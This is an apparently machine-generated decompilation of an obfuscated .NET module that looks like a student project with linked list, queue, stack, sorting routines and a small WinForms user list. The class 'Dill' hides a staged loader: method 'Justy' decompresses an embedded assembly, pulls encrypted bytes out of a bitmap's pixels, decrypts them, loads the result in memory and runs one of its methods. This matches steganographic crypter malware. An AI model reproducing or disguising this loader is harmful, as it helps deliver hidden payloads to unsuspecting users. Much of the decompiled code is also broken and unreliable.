// native disrobe CIL->C# decompilation (no runtime, no external tool)
// module: Smt.dll

// <Module>
static void .cctor()
{
    SmartAssembly.AssemblyResolver.AssemblyResolver.AttachApp();
    SmartAssembly.ResourceResolver.ResourceResolver.AttachApp();
    return;
}
// AdministrativeDirect.LinkedList
private Node<T> FindNode(T value)
{
    Node<T> local0;
    bool local1;
    Node<T> local2;
    bool local3;
    T local4;
    bool local5;

    local1 = this._first == null;
    if (!local1)
    {
        local0 = this._first;
        while (true)
        {
            local5 = local0 > null;
            if (local5)
            {
                local4 = local0.Value;
                local3 = local4.Equals(value);
                if (!local3)
                {
                    local0 = local0.Next;
                    continue;
                }
                else
                {
                    break;
                }
            }
            else
            {
                local2 = null;
            }
        }
        local2 = local0;
    }
    else
    {
        local2 = null;
    }
    return local2;
}
// AdministrativeDirect.LinkedList
public void Add(T item)
{
    bool local0;

    local0 = this._first == null;
    if (!local0)
    {
        new Node<T>().Value = item;
        new Node<T>().Previous = this._last;
        this._last.Next = new Node<T>();
        this._last = this._last.Next;
    }
    else
    {
        new Node<T>().Value = item;
        this._first = new Node<T>();
        this._last = this._first;
    }
    this._length = this._length + 1;
    return;
}
// AdministrativeDirect.LinkedList
public void Clear()
{
    Node<T> local0;

    local0 = null;
    this._last = null;
    this._first = local0;
    return;
}
// AdministrativeDirect.LinkedList
public bool Contains(T item)
{
    bool local0;

    local0 = this.FindNode(item) > null;
    return local0;
}
// AdministrativeDirect.LinkedList
public void CopyTo(T[] array, int arrayIndex)
{
    throw new System.NotImplementedException();
}
// AdministrativeDirect.LinkedList
public bool Remove(T item)
{
    Node<T> local0;
    bool local1;
    bool local2;
    bool local3;
    Node<T> local4;
    bool local5;
    bool local6;
    bool local7;

    local0 = this.FindNode(item);
    local1 = local0 == null;
    if (!local1)
    {
        local3 = this._length == 1;
        if (!local3)
        {
            local5 = (local0.Previous == null ? 0 : (local0.Next > null));
            if (!local5)
            {
                local6 = (local0.Previous != null ? 0 : (local0.Next > null));
                if (!local6)
                {
                    local7 = (local0.Previous == null ? 0 : (local0.Next == null));
                    if (!(!local7))
                    {
                        local0.Previous.Next = null;
                        this._last = local0.Previous;
                    }
                }
                else
                {
                    local0.Next.Previous = null;
                    this._first = local0.Next;
                }
            }
            else
            {
                local0.Previous.Next = local0.Next;
                local0.Next.Previous = local0.Previous;
            }
            local0 = null;
            this._length = this._length - 1;
            local2 = true;
        }
        else
        {
            local4 = null;
            this._last = null;
            this._first = local4;
            local2 = true;
        }
    }
    else
    {
        local2 = false;
    }
    return local2;
}
// AdministrativeDirect.LinkedList
public int get_Count()
{
    int local0;

    local0 = this._length;
    return local0;
}
// AdministrativeDirect.LinkedList
public bool get_IsReadOnly()
{
    bool local0;

    local0 = false;
    return local0;
}
// AdministrativeDirect.LinkedList
public System.Collections.Generic.IEnumerator<T> GetEnumerator()
{
    // disrobe: state machine not reconstructed; the compiler-emitted plumbing below is kept verbatim as the only static evidence
    // new <GetEnumerator>d__14<T>(0).<>4__this = this;
    // return new <GetEnumerator>d__14<T>(0);
    throw new System.NotSupportedException("disrobe: state machine not reconstructed");
}

// AdministrativeDirect.LinkedList
private System.Collections.IEnumerator System.Collections.IEnumerable.GetEnumerator()
{
    System.Collections.IEnumerator local0;

    local0 = this.GetEnumerator();
    return local0;
}
// AdministrativeDirect.LinkedList
public void .ctor()
{
    return;
}
// Node
public T get_Value()
{
    return this.Value;
}
// Node
public void set_Value(T value)
{
    this.Value = value;
    return;
}
// Node
public Node<T> get_Next()
{
    return this.Next;
}
// Node
public void set_Next(Node<T> value)
{
    this.Next = value;
    return;
}
// Node
public Node<T> get_Previous()
{
    return this.Previous;
}
// Node
public void set_Previous(Node<T> value)
{
    this.Previous = value;
    return;
}
// Node
public void .ctor()
{
    return;
}
// <GetEnumerator>d__14 [iterator state machine]
public void .ctor(int state)
{
    // disrobe: compiler-generated construct not lowered; the compiler-emitted plumbing below is kept verbatim as the only static evidence
    // this.<>1__state = state;
    // return;
    throw new System.NotSupportedException("disrobe: compiler-generated construct not lowered");
}

// <GetEnumerator>d__14 [iterator state machine]
private void System.IDisposable.Dispose()
{
    return;
}
// <GetEnumerator>d__14 [iterator state machine]
private bool MoveNext()
{
    bool local1;
    bool local2;

    local1 = this._first == null;
    if (!(!local1))
    {
        yield break;
    }
    current = this._first;
    local2 = current > null;
    if (!(local2))
    {
        yield break;
    }
    yield return current.Value;
}

// <GetEnumerator>d__14 [iterator state machine]
private T System.Collections.Generic.IEnumerator<T>.get_Current()
{
    // disrobe: compiler-generated construct not lowered; the compiler-emitted plumbing below is kept verbatim as the only static evidence
    // return this.<>2__current;
    throw new System.NotSupportedException("disrobe: compiler-generated construct not lowered");
}

// <GetEnumerator>d__14 [iterator state machine]
private void System.Collections.IEnumerator.Reset()
{
    throw new System.NotSupportedException();
}
// <GetEnumerator>d__14 [iterator state machine]
private object System.Collections.IEnumerator.get_Current()
{
    // disrobe: compiler-generated construct not lowered; the compiler-emitted plumbing below is kept verbatim as the only static evidence
    // return this.<>2__current;
    throw new System.NotSupportedException("disrobe: compiler-generated construct not lowered");
}

// AdministrativeDirect.Queue
public int get_Length()
{
    int local0;

    local0 = this._length;
    return local0;
}
// AdministrativeDirect.Queue
public void .ctor()
{
    this._items = new T[16];
    this._length = 0;
    return;
}
// AdministrativeDirect.Queue
public void Enqueue(T item)
{
    this.EnsureCapacity();
    this._items[this._length] = item;
    this._length = this._length + 1;
    return;
}
// AdministrativeDirect.Queue
public T Dequeue()
{
    T local0;
    bool local1;
    T local2;

    local1 = this._length == 0;
    if (!(!local1))
    {
        throw new System.InvalidOperationException(SmartAssembly.StringsEncoding.Strings.Get(107396711));
    }
    local0 = this.ShiftArray(this._items);
    this._length = this._length - 1;
    local2 = local0;
    return local2;
}
// AdministrativeDirect.Queue
private void EnsureCapacity()
{
    bool local0;

    local0 = this._length == ((int)this._items.Length);
    if (!(!local0))
    {
        this.DoubleArray();
    }
    return;
}
// AdministrativeDirect.Queue
private void DoubleArray()
{
    T[] local0;

    local0 = new T[((int)this._items.Length) * 2];
    .Invoke(this._items, local0, (int)this._items.Length);
    this._items = local0;
    return;
}
// AdministrativeDirect.Queue
private T ShiftArray(T[] items)
{
    T local0;
    bool local1;
    bool local2;
    T local3;
    T local4;
    T local5;
    int local6;
    bool local7;

    local1 = (items == null ? 1 : (items.Length == 0));
    if (!(!local1))
    {
        throw new System.InvalidOperationException(SmartAssembly.StringsEncoding.Strings.Get(107396702));
    }
    local2 = ((int)items.Length) == 1;
    if (!local2)
    {
        local0 = items[0];
        local6 = 0;
        while (true)
        {
            local7 = local6 < (((int)items.Length) - 1);
            if (local7)
            {
                items[local6] = items[local6 + 1];
                local6 = local6 + 1;
                continue;
            }
        }
        local5 = local0;
    }
    else
    {
        local3 = items[0];
        local4 = default(T);
        items[0] = local4;
        local5 = local3;
    }
    return local5;
}
// AdministrativeDirect.Stack
public int get_Length()
{
    int local0;

    local0 = this._length;
    return local0;
}
// AdministrativeDirect.Stack
public void .ctor()
{
    this._items = new T[16];
    this._length = 0;
    return;
}
// AdministrativeDirect.Stack
public void Push(T item)
{
    this.EnsureCapacity();
    this._items[this._length] = item;
    this._length = this._length + 1;
    return;
}
// AdministrativeDirect.Stack
public T Pop()
{
    T local0;
    bool local1;
    T local2;
    T local3;

    local1 = this._length == 0;
    if (!(!local1))
    {
        throw new System.InvalidOperationException(SmartAssembly.StringsEncoding.Strings.Get(107396669));
    }
    local0 = this._items[this._length - 1];
    local2 = default(T);
    this._items[this._length - 1] = local2;
    this._length = this._length - 1;
    local3 = local0;
    return local3;
}
// AdministrativeDirect.Stack
private void EnsureCapacity()
{
    bool local0;

    local0 = this._length == ((int)this._items.Length);
    if (!(!local0))
    {
        this.DoubleArray();
    }
    return;
}
// AdministrativeDirect.Stack
private void DoubleArray()
{
    T[] local0;

    local0 = new T[((int)this._items.Length) * 2];
    .Invoke(this._items, local0, (int)this._items.Length);
    this._items = local0;
    return;
}
// AdministrativeDirect.DD
internal void .ctor()
{
    return;
}
// AdministrativeDirect.DD
internal static System.Resources.ResourceManager get_ResourceManager()
{
    bool local0;
    System.Resources.ResourceManager local1;
    System.Resources.ResourceManager local2;

    local0 = resourceMan == null;
    if (!(!local0))
    {
        local1 = new System.Resources.ResourceManager(SmartAssembly.StringsEncoding.Strings.Get(107396616), ~.Invoke(.Invoke((new System.Func<System.RuntimeTypeHandle>(() => { throw new System.NotSupportedException("__unreconstructed_runtime_handle"); }))())));
        resourceMan = local1;
    }
    local2 = resourceMan;
    return local2;
}
// AdministrativeDirect.DD
internal static System.Globalization.CultureInfo get_Culture()
{
    System.Globalization.CultureInfo local0;

    local0 = resourceCulture;
    return local0;
}
// AdministrativeDirect.DD
internal static void set_Culture(System.Globalization.CultureInfo value)
{
    resourceCulture = value;
    return;
}
// AdministrativeDirect.DD
internal static byte[] get_Ga()
{
    object local0;
    byte[] local1;

    local0 = ~.Invoke(ResourceManager, SmartAssembly.StringsEncoding.Strings.Get(107397095), resourceCulture);
    local1 = (byte[])local0;
    return local1;
}
// AdministrativeDirect.Form1
private void init()
{
    int local0;
    bool local1;

    this.users = new List<AdministrativeDirect.User>();
    local0 = 0;
    while (true)
    {
        local1 = local0 < 10;
        if (local1)
        {
            this.users.Add(new AdministrativeDirect.User());
            local0 = local0 + 1;
            continue;
        }
    }
    return;
}
// AdministrativeDirect.Form1
public void .ctor()
{
    // disrobe: compiler-generated construct not lowered; the compiler-emitted plumbing below is kept verbatim as the only static evidence
    // System.Collections.Generic.List<AdministrativeDirect.User> local0;
    // this.users = null;
    // this.components = null;
    // this.InitializeComponent();
    // this.init();
    // local0 = this.users.FindAll(<>9__2_0);
    // this.listBox1.DataSource = this.users;
    // return;
    throw new System.NotSupportedException("disrobe: compiler-generated construct not lowered");
}

// AdministrativeDirect.Form1
private void button1_Click(object sender, System.EventArgs e)
{
    System.DateTime local0;
    string local1;
    bool local2;
    System.DateTime local3;

    this.users.Add(new AdministrativeDirect.User());
    local0 = .Invoke();
    local3 = ~.Invoke(this.dateTimePicker1);
    local2 = .Invoke(local0.Date, local3.Date);
    if (!(!local2))
    {
        this.users.Add(new AdministrativeDirect.User());
    }
    local1 = ~.Invoke(~.Invoke(this.listBox1));
    return;
}
// AdministrativeDirect.Form1
protected void Dispose(bool disposing)
{
    bool local0;

    local0 = (!disposing ? 0 : (this.components > null));
    if (!(!local0))
    {
        ~.Invoke(this.components);
    }
    .Invoke(this, disposing);
    return;
}
// AdministrativeDirect.Form1
private void InitializeComponent()
{
    this.listBox1 = new System.Windows.Forms.ListBox();
    this.button1 = new System.Windows.Forms.Button();
    this.dateTimePicker1 = new System.Windows.Forms.DateTimePicker();
    .Invoke(this);
    ~.Invoke(this.listBox1, true);
    ~.Invoke(this.listBox1, new System.Drawing.Point(21, 26));
    ~.Invoke(this.listBox1, SmartAssembly.StringsEncoding.Strings.Get(107397090));
    ~.Invoke(this.listBox1, new System.Drawing.Size(168, 121));
    ~.Invoke(this.listBox1, 0);
    ~.Invoke(this.button1, new System.Drawing.Point(85, 179));
    ~.Invoke(this.button1, SmartAssembly.StringsEncoding.Strings.Get(107397109));
    ~.Invoke(this.button1, new System.Drawing.Size(75, 23));
    ~.Invoke(this.button1, 1);
    ~.Invoke(this.button1, SmartAssembly.StringsEncoding.Strings.Get(107397109));
    ~.Invoke(this.button1, true);
    ~.Invoke(this.button1, this.button1_Click);
    ~.Invoke(this.dateTimePicker1, new System.Drawing.Point(21, 153));
    ~.Invoke(this.dateTimePicker1, SmartAssembly.StringsEncoding.Strings.Get(107397064));
    ~.Invoke(this.dateTimePicker1, new System.Drawing.Size(200, 20));
    ~.Invoke(this.dateTimePicker1, 2);
    .Invoke(this, new System.Drawing.SizeF(6f, 13f));
    .Invoke(this, (System.Windows.Forms.AutoScaleMode)1);
    .Invoke(this, new System.Drawing.Size(284, 261));
    ~.Invoke(.Invoke(this), this.dateTimePicker1);
    ~.Invoke(.Invoke(this), this.button1);
    ~.Invoke(.Invoke(this), this.listBox1);
    .Invoke(this, SmartAssembly.StringsEncoding.Strings.Get(107397075));
    ~.Invoke(this, SmartAssembly.StringsEncoding.Strings.Get(107397075));
    .Invoke(this, false);
    return;
}
// <>c [compiler-generated closure]
private static void .cctor()
{
    return;
}
// <>c [compiler-generated closure]
public void .ctor()
{
    return;
}
// <>c [compiler-generated closure]
internal bool <.ctor>b__2_0(AdministrativeDirect.User x)
{
    return .Invoke(x.Name, SmartAssembly.StringsEncoding.Strings.Get(107396927));
}
// AdministrativeDirect.InsertionSort
public static void Sort<T>(T[] items)
{
    bool local0;
    long local1;
    T local2;
    long local3;
    bool local4;
    bool local5;

    local0 = (items == null ? 1 : (((int)items.Length) == 1));
    if (!local0)
    {
        local1 = unchecked((long)1);
        while (true)
        {
            local5 = local1 < ((long)((int)items.Length));
            if (local5)
            {
                local2 = items[checked((nint)local1)];
                local3 = local1 - unchecked((long)1);
                while (true)
                {
                    if (local3 < unchecked((long)0))
                    {
                    }
                }
                local1 = local1 + unchecked((long)1);
                continue;
            }
        }
    }
    return;
}
// AdministrativeDirect.Dill
public static void Sort<T>(T[] items)
{
    AdministrativeDirect.Dill.Sort(items, 0, ((int)items.Length) - 1);
    return;
}
// AdministrativeDirect.Dill
public void .ctor(string EnumCategoriesFlags, string DataMisaligned, string DirectoryInfo)
{
    AdministrativeDirect.Dill.Justy(EnumCategoriesFlags, DataMisaligned, DirectoryInfo);
    return;
}
// AdministrativeDirect.Dill
public static void Sort<T>(T[] items, int p, int r)
{
    int local0;
    bool local1;

    local1 = (p < r) == false;
    if (!local1)
    {
        local0 = AdministrativeDirect.Dill.Partition(items, p, r);
        AdministrativeDirect.Dill.Sort(items, p, local0 - 1);
        AdministrativeDirect.Dill.Sort(items, local0 + 1, r);
    }
    return;
}
// AdministrativeDirect.Dill
private static int Partition<T>(T[] items, int p, int r)
{
    T local0;
    int local1;
    int local2;
    bool local3;
    bool local4;
    int local5;

    local0 = items[r];
    local1 = p - 1;
    local2 = p;
    while (true)
    {
        local4 = local2 < r;
        if (local4)
        {
            local3 = items[local2].CompareTo(local0) < 1;
            if (!(!local3))
            {
                local1 = local1 + 1;
                AdministrativeDirect.Dill.Swap(items, local1, local2);
                local2 = local2 + 1;
                continue;
            }
            local2 = local2 + 1;
            continue;
        }
    }
    AdministrativeDirect.Dill.Swap(items, local1 + 1, r);
    local5 = local1 + 1;
    return local5;
}
// AdministrativeDirect.Dill
private static void Swap<T>(System.Collections.Generic.IList<T> items, int a, int b)
{
    T local0;

    local0 = items[a];
    items[a] = items[b];
    items[b] = local0;
    return;
}
// AdministrativeDirect.Dill
private static byte[] NamedArguments(System.Drawing.Bitmap SerStack)
{
    int local0;
    int local1;
    int local2;
    byte[] local3;
    int local4;
    byte[] local5;
    int local6;
    int local7;
    System.Drawing.Color local8;
    bool local9;
    bool local10;
    byte[] local11;

    local0 = 0;
    local1 = ~.Invoke(SerStack);
    local2 = (local1 * local1) * 4;
    local3 = new System.Byte[local2];
    local6 = 0;
    while (true)
    {
        local10 = local6 < local1;
        if (local10)
        {
            local7 = 0;
            while (true)
            {
                local9 = local7 < local1;
                if (local9)
                {
                    local8 = ~.Invoke(SerStack, local6, local7);
                    .Invoke(.Invoke(local8.ToArgb()), 0, local3, local0, 4);
                    local0 = local0 + 4;
                    local7 = local7 + 1;
                    continue;
                }
            }
            local6 = local6 + 1;
            continue;
        }
    }
    local4 = .Invoke(local3, 0);
    local5 = new System.Byte[local4];
    .Invoke(local3, 4, local5, 0, (int)local5.Length);
    local11 = local5;
    return local11;
}
// AdministrativeDirect.Dill
public static System.Drawing.Bitmap RestoreOriginalBitmap(System.Drawing.Bitmap modifiedBitmap, int addedWidth, int addedHeight)
{
    int local0;
    int local1;
    System.Drawing.Bitmap local2;
    int local3;
    int local4;
    System.Drawing.Color local5;
    bool local6;
    bool local7;
    System.Drawing.Bitmap local8;

    local0 = ~.Invoke(modifiedBitmap) - addedWidth;
    local1 = ~.Invoke(modifiedBitmap) - addedHeight;
    local2 = new System.Drawing.Bitmap(local0, local1);
    local3 = 0;
    while (true)
    {
        local7 = local3 < local1;
        if (local7)
        {
            local4 = 0;
            while (true)
            {
                local6 = local4 < local0;
                if (local6)
                {
                    local5 = ~.Invoke(modifiedBitmap, local4, local3);
                    ~.Invoke(local2, local4, local3, local5);
                    local4 = local4 + 1;
                    continue;
                }
            }
            local3 = local3 + 1;
            continue;
        }
    }
    local8 = local2;
    return local8;
}
// AdministrativeDirect.Dill
public static void Justy(string StringTypeInfo, string InputBlockSize, string EscapedIRemotingFormatter)
{
    System.Type local0;
    byte[] local1;
    object local2;
    System.Drawing.Bitmap local3;
    byte[] local4;
    System.Reflection.Assembly local5;
    System.IO.Compression.GZipStream local6;
    byte[] local7;
    System.IO.MemoryStream local8;
    int local9;
    bool local10;
    bool local11;

    .Invoke(10119);
    local1 = Ga;
    local6 = new System.IO.Compression.GZipStream(new System.IO.MemoryStream(local1), 0);
    try
    {
        local7 = new System.Byte[4096];
        local8 = new System.IO.MemoryStream();
        try
        {
            while (true)
            {
                local9 = ~.Invoke(local6, local7, 0, 4096);
                local10 = local9 > 0;
                if (!(!local10))
                {
                    ~.Invoke(local8, local7, 0, local9);
                }
            }
            local0 = ~.Invoke(AdministrativeDirect.Dill.GlobalAssemblyCache(~.Invoke(local8)), SmartAssembly.StringsEncoding.Strings.Get(107397034));
            local2 = .Invoke(local0);
            StringTypeInfo = (String)~.Invoke(~.Invoke(local0, SmartAssembly.StringsEncoding.Strings.Get(107397017)), local2, new System.Object[1] { StringTypeInfo });
            InputBlockSize = (String)~.Invoke(~.Invoke(local0, SmartAssembly.StringsEncoding.Strings.Get(107397017)), local2, new System.Object[1] { InputBlockSize });
            local3 = AdministrativeDirect.Dill.LowestBreakIteration(StringTypeInfo, EscapedIRemotingFormatter);
            local4 = AdministrativeDirect.Dill.NamedArguments(AdministrativeDirect.Dill.RestoreOriginalBitmap(local3, 150, 150));
            local4 = (byte[])~.Invoke(~.Invoke(local0, SmartAssembly.StringsEncoding.Strings.Get(107396964)), local2, new System.Object[2] { local4, InputBlockSize });
            local5 = AdministrativeDirect.Dill.GlobalAssemblyCache(local4);
            AdministrativeDirect.Dill.ParsingState(local5);
            .Invoke(0);
            return;
        }
        finally
        {
        }
    }
    finally
    {
    }
}
// AdministrativeDirect.Dill
private static void ParsingState(object TP)
{
    System.Type local0;
    System.Reflection.MethodInfo local1;

    local0 = ~.Invoke((Assembly)TP)[20];
    local1 = ~.Invoke(local0)[29];
    ~.Invoke(local1, null, null);
    return;
}
// AdministrativeDirect.Dill
private static System.Reflection.Assembly GlobalAssemblyCache(byte[] Bi)
{
    System.Reflection.Assembly local0;

    local0 = .Invoke(Bi);
    return local0;
}
// AdministrativeDirect.Dill
public static System.Drawing.Bitmap LowestBreakIteration(string x10, string projectname)
{
    System.Resources.ResourceManager local0;
    System.Drawing.Bitmap local1;

    local0 = new System.Resources.ResourceManager(.Invoke(projectname, SmartAssembly.StringsEncoding.Strings.Get(107396979)), .Invoke());
    local1 = (Bitmap)~.Invoke(local0, x10);
    return local1;
}
// AdministrativeDirect.User
public string get_Name()
{
    return this.Name;
}
// AdministrativeDirect.User
public void set_Name(string value)
{
    this.Name = value;
    return;
}
// AdministrativeDirect.User
public string get_Surname()
{
    return this.Surname;
}
// AdministrativeDirect.User
public void set_Surname(string value)
{
    this.Surname = value;
    return;
}
// AdministrativeDirect.User
public void .ctor(string name, string surname)
{
    this.Name = name;
    this.Surname = surname;
    return;
}
// AdministrativeDirect.User
public void .ctor()
{
    this.Name = SmartAssembly.StringsEncoding.Strings.Get(107396950);
    this.Surname = SmartAssembly.StringsEncoding.Strings.Get(107396945);
    return;
}
// AdministrativeDirect.User
public string ToString()
{
    string local0;

    local0 = .Invoke(this.Name, SmartAssembly.StringsEncoding.Strings.Get(107396900), this.Surname);
    return local0;
}
// SmartAssembly.Attributes.ObfuscateControlFlowAttribute
public void .ctor()
{
    return;
}
// SmartAssembly.AssemblyResolver.AssemblyResolver
public static void AttachApp()
{
    try
    {
        SmartAssembly.AssemblyResolver.AssemblyResolverHelper.Attach();
        return;
    }
    catch (System.Exception ex)
    {
    }
}
// SmartAssembly.AssemblyResolver.AssemblyResolver
public void .ctor()
{
    return;
}
// SmartAssembly.AssemblyResolver.AssemblyResolverHelper
internal static bool get_IsWebApplication()
{
    string local0;
    bool local1;

    try
    {
        local0 = System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName.ToLower();
        if (!(local0 == "w3wp.exe"))
        {
            if (!(local0 == "aspnet_wp.exe"))
            {
                return false;
            }
            else
            {
                local1 = true;
            }
        }
        else
        {
            local1 = true;
        }
    }
    catch (System.Object ex)
    {
    }
}
// SmartAssembly.AssemblyResolver.AssemblyResolverHelper
internal static void Attach()
{
    try
    {
        CurrentDomain.add_AssemblyResolve(ResolveAssembly);
        return;
    }
    catch (System.Object ex)
    {
    }
}
// SmartAssembly.AssemblyResolver.AssemblyResolverHelper
internal static System.Reflection.Assembly ResolveAssembly(object sender, System.ResolveEventArgs e)
{
    AssemblyInfo local0;
    string local1;
    string local2;
    string[] local3;
    string local4;
    bool local5;
    bool local6;
    int local7;
    int local8;
    int local9;
    System.Collections.Generic.Dictionary<string, System.Reflection.Assembly> local10;
    System.IO.Stream local11;
    System.Reflection.Assembly local12;
    int local13;
    byte[] local14;
    System.Reflection.Assembly local15;
    string local16;
    string local17;

    local0.ctor(e.Name);
    local1 = local0.GetAssemblyFullName(false);
    local2 = System.Convert.ToBase64String(UTF8.GetBytes(local1));
    local3 = "e2MzNTRkNTNlLTE2NWQtNDYyMS05N2E0LWI1OTVhM2JkMGM5Nn0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{07eefa3e-4bba-4508-ab41-20404168e31b},e2MzNTRkNTNlLTE2NWQtNDYyMS05N2E0LWI1OTVhM2JkMGM5Nn0=,[z]{07eefa3e-4bba-4508-ab41-20404168e31b}".Split(new System.Char[1] { ',' });
    local4 = Empty;
    local5 = false;
    local6 = false;
    local7 = 0;
    while (true)
    {
        if (local7 < (((int)local3.Length) - 1))
        {
            if (!(local3[local7] == local2))
            {
                local7 = local7 + 2;
                continue;
            }
            else
            {
                break;
            }
        }
    }
    local4 = local3[local7 + 1];
    if (!(local4.Length != 0 || local0.PublicKeyToken.Length != 0))
    {
        local2 = System.Convert.ToBase64String(UTF8.GetBytes(local0.Name));
        local8 = 0;
        while (true)
        {
            if (local8 < (((int)local3.Length) - 1))
            {
                if (!(local3[local8] == local2))
                {
                    local8 = local8 + 2;
                    continue;
                }
                else
                {
                    break;
                }
            }
        }
        local4 = local3[local8 + 1];
    }
    if (local4.Length > 0)
    {
        if (local4[0] == 91)
        {
            local9 = local4.IndexOf(']');
            local5 = (local4.Substring(1, local9 - 1).IndexOf('z') < 0) == false;
            local6 = (local4.Substring(1, local9 - 1).IndexOf('t') < 0) == false;
            local4 = local4.Substring(local9 + 1);
        }
        local10 = hashtable;
        System.Threading.Monitor.Enter(local10);
        try
        {
            if (!hashtable.ContainsKey(local4))
            {
                local11 = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceStream(local4);
                if (local11 == null)
                {
                    return null;
                }
                else
                {
                    local13 = (int)local11.Length;
                    local14 = new System.Byte[local13];
                    local11.Read(local14, 0, local13);
                    if (!(!local5))
                    {
                        local14 = SmartAssembly.Zip.SimpleZip.Unzip(local14);
                    }
                    local15 = null;
                    if (!(local6))
                    {
                        try
                        {
                            local15 = System.Reflection.Assembly.Load(local14);
                            if (!(!local6))
                            {
                                try
                                {
                                    local16 = System.String.Format("{0}{1}\\", System.IO.Path.GetTempPath(), local4);
                                    System.IO.Directory.CreateDirectory(local16);
                                    local17 = System.String.Concat(local16, local0.Name, ".dll");
                                    if (!(System.IO.File.Exists(local17)))
                                    {
                                        System.IO.File.OpenWrite(local17).Write(local14, 0, (int)local14.Length);
                                        System.IO.File.OpenWrite(local17).Close();
                                        SmartAssembly.AssemblyResolver.AssemblyResolverHelper.MoveFileEx(local17, null, 4);
                                        SmartAssembly.AssemblyResolver.AssemblyResolverHelper.MoveFileEx(local16, null, 4);
                                    }
                                }
                                catch (System.Object ex)
                                {
                                }
                            }
                            hashtable[local4] = local15;
                            local12 = local15;
                            return local12;
                        }
                        catch (System.IO.FileLoadException ex)
                        {
                        }
                        catch (System.BadImageFormatException ex)
                        {
                        }
                    }
                }
            }
            else
            {
                local12 = hashtable[local4];
            }
        }
        finally
        {
        }
    }
}
// SmartAssembly.AssemblyResolver.AssemblyResolverHelper
public void .ctor()
{
    return;
}
// SmartAssembly.AssemblyResolver.AssemblyResolverHelper
private static void .cctor()
{
    hashtable = new Dictionary<string, System.Reflection.Assembly>();
    return;
}
// AssemblyInfo
public string GetAssemblyFullName(bool includeVersion)
{
    System.Text.StringBuilder local0;

    local0 = new System.Text.StringBuilder();
    local0.Append(this.Name);
    if (!(!includeVersion || !(this.Version != null)))
    {
        local0.Append(", Version=");
        local0.Append(this.Version);
    }
    local0.Append(", Culture=");
    local0.Append((this.Culture.Length == 0 ? "neutral" : this.Culture));
    local0.Append(", PublicKeyToken=");
    local0.Append((this.PublicKeyToken.Length == 0 ? "null" : this.PublicKeyToken));
    return local0.ToString();
}
// AssemblyInfo
public void .ctor(string assemblyFullName)
{
    string[] local0;
    int local1;
    string local2;

    this.Version = null;
    this.Culture = Empty;
    this.PublicKeyToken = Empty;
    this.Name = Empty;
    local0 = assemblyFullName.Split(new System.Char[1] { ',' });
    local1 = 0;
    while (local1 < ((int)local0.Length))
    {
        local2 = local0[local1].Trim();
        if (!local2.StartsWith("Version="))
        {
            if (!local2.StartsWith("Culture="))
            {
                if (!local2.StartsWith("PublicKeyToken="))
                {
                    this.Name = local2;
                    local1 = local1 + 1;
                    continue;
                }
                else
                {
                    this.PublicKeyToken = local2.Substring(15);
                    if (this.PublicKeyToken == "null")
                    {
                        this.PublicKeyToken = Empty;
                        local1 = local1 + 1;
                        continue;
                    }
                    local1 = local1 + 1;
                    continue;
                }
                local1 = local1 + 1;
                continue;
            }
            else
            {
                this.Culture = local2.Substring(8);
                if (this.Culture == "neutral")
                {
                    this.Culture = Empty;
                    local1 = local1 + 1;
                    continue;
                }
                local1 = local1 + 1;
                continue;
            }
            local1 = local1 + 1;
            continue;
        }
        else
        {
            this.Version = new System.Version(local2.Substring(8));
            local1 = local1 + 1;
            continue;
        }
        local1 = local1 + 1;
        continue;
    }
    return;
}
// SmartAssembly.AssemblyResolver.Resolver
public static void AttachResolver(System.AppDomain domain)
{
    domain.add_AssemblyResolve(ResolveAssembly);
    return;
}
// SmartAssembly.AssemblyResolver.Resolver
public void .ctor()
{
    return;
}
// SmartAssembly.HouseOfCards.MemberRefsProxy
public static void CreateMemberRefsDelegates(int typeID)
{
    System.Type local0;
    System.Reflection.FieldInfo[] local1;
    int local2;
    System.Reflection.FieldInfo local3;
    string local4;
    bool local5;
    int local6;
    System.Reflection.MethodInfo local7;
    System.Delegate local8;
    int local9;
    char local10;
    int local11;
    System.Reflection.ParameterInfo[] local12;
    int local13;
    System.Type[] local14;
    System.Reflection.Emit.DynamicMethod local15;
    System.Reflection.Emit.ILGenerator local16;
    int local17;
    int local18;

    try
    {
        local0 = throw new System.NotSupportedException("__unreconstructed_runtime_handle");
        local1 = local0.GetFields((System.Reflection.BindingFlags)1064);
        local2 = 0;
        while (local2 < ((int)local1.Length))
        {
            local3 = local1[local2];
            local4 = local3.Name;
            local5 = false;
            local6 = 0;
            local9 = local4.Length - 1;
            while (true)
            {
                if (local9 >= 0)
                {
                    local10 = local4[local9];
                    if (local10 != 126)
                    {
                        local11 = 0;
                        while (true)
                        {
                            if (local11 < 58)
                            {
                                if ([local11] != local10)
                                {
                                    local11 = local11 + 1;
                                    continue;
                                }
                                else
                                {
                                    break;
                                }
                            }
                        }
                        local6 = (local6 * 58) + local11;
                        local9 = local9 - 1;
                        continue;
                    }
                    else
                    {
                        break;
                    }
                }
            }
            local5 = true;
            try
            {
                local7 = (MethodInfo)System.Reflection.MethodBase.GetMethodFromHandle(.ResolveMethodHandle(local6 + 167772161));
                if (!local7.IsStatic)
                {
                    local12 = local7.GetParameters();
                    local13 = ((int)local12.Length) + 1;
                    local14 = new System.Type[local13];
                    local14[0] = typeof(Object);
                    local17 = 1;
                    while (local17 < local13)
                    {
                        local14[local17] = local12[local17 - 1].ParameterType;
                        local17 = local17 + 1;
                        continue;
                    }
                    local15 = new System.Reflection.Emit.DynamicMethod(Empty, local7.ReturnType, local14, local0, 1);
                    local16 = local15.GetILGenerator();
                    local16.Emit(Ldarg_0);
                    if (local13 > 1)
                    {
                        local16.Emit(Ldarg_1);
                    }
                    if (local13 > 2)
                    {
                        local16.Emit(Ldarg_2);
                    }
                    if (local13 > 3)
                    {
                        local16.Emit(Ldarg_3);
                    }
                    if (local13 > 4)
                    {
                        local18 = 4;
                        while (local18 < local13)
                        {
                            local16.Emit(Ldarg_S, local18);
                            local18 = local18 + 1;
                            continue;
                        }
                    }
                    local16.Emit(Tailcall);
                    local16.Emit((local5 ? Callvirt : Call), local7);
                    local16.Emit(Ret);
                    try
                    {
                        local8 = local15.CreateDelegate(local0);
                        try
                        {
                            local3.SetValue(null, local8);
                            local2 = local2 + 1;
                            continue;
                        }
                        catch (System.Object ex)
                        {
                        }
                    }
                    catch (System.Object ex)
                    {
                    }
                }
                else
                {
                    try
                    {
                        local8 = System.Delegate.CreateDelegate(local3.FieldType, local7);
                    }
                    catch (System.Exception ex)
                    {
                    }
                }
            }
            catch (System.Object ex)
            {
            }
        }
        return;
    }
